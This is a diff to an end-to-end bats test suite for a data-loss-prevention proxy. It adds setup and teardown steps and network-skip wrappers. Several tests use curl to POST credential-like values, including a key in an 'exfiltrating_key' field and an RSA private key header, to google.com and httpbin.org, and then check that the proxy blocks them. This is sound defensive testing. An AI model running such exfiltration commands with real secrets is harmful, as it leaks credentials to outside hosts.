@@ -1,4 +1,5 @@
 #!/usr/bin/env bats
+# bats file_tags=e2e,sentinel
 # DLP Module E2E Tests
 # Tests for credential detection and blocking via srv_polis_dlp
 #
@@ -8,6 +9,12 @@
 setup_file() {
     load "../helpers/common.bash"
     relax_security_level
+    wait_for_port "$ICAP_CONTAINER" 1344 || skip "ICAP port 1344 not ready"
+}
+
+teardown_file() {
+    load "../helpers/common.bash"
+    restore_security_level
 }
 
 setup() {
@@ -19,9 +26,13 @@ setup() {
     RSA_PRIVATE_KEY="-----BEGIN RSA PRIVATE KEY-----"
 }
 
+teardown() {
+    docker exec "${WORKSPACE_CONTAINER}" rm -f /tmp/large_payload 2>/dev/null || true
+}
+
 @test "e2e-dlp: Anthropic key to api.anthropic.com is ALLOWED" {
     # Credentials to allowed destination should pass through (not blocked by DLP)
-    run docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
+    run_with_network_skip "anthropic.com" docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
         -X POST -d "key=${ANTHROPIC_KEY}" \
         --connect-timeout 15 https://api.anthropic.com/v1/messages
     # Must NOT contain polis block headers
@@ -29,7 +40,7 @@ setup() {
 }
 
 @test "e2e-dlp: Anthropic key to google.com is BLOCKED" {
-    run docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
+    run_with_network_skip "google.com" docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
         -X POST -d "exfiltrating_key=${ANTHROPIC_KEY}" \
         --connect-timeout 15 https://www.google.com
     assert_output --partial "x-polis-block: true"
@@ -39,7 +50,7 @@ setup() {
 }
 
 @test "e2e-dlp: RSA private key to any destination is BLOCKED" {
-    run docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
+    run_with_network_skip "httpbin.org" docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
         -X POST -d "data=${RSA_PRIVATE_KEY}" \
         --connect-timeout 15 https://httpbin.org/post
     assert_output --partial "x-polis-block: true"
@@ -47,7 +58,7 @@ setup() {
 }
 
 @test "e2e-dlp: plain traffic without credentials is ALLOWED" {
-    run docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
+    run_with_network_skip "httpbin.org" docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
         -X POST -d "hello=world" \
         --connect-timeout 15 https://httpbin.org/post
     refute_output --partial "x-polis-block"
@@ -57,12 +68,9 @@ setup() {
     docker exec "${WORKSPACE_CONTAINER}" sh -c \
         "dd if=/dev/zero bs=1M count=1 2>/dev/null > /tmp/large_payload && echo '${ANTHROPIC_KEY}' >> /tmp/large_payload"
 
-    run docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
+    run_with_network_skip "httpbin.org" docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
         -X POST --data-binary @/tmp/large_payload \
         --connect-timeout 15 https://httpbin.org/post
 
     assert_output --partial "x-polis-block: true"
-
-    # Cleanup
-    docker exec "${WORKSPACE_CONTAINER}" rm -f /tmp/large_payload
 }
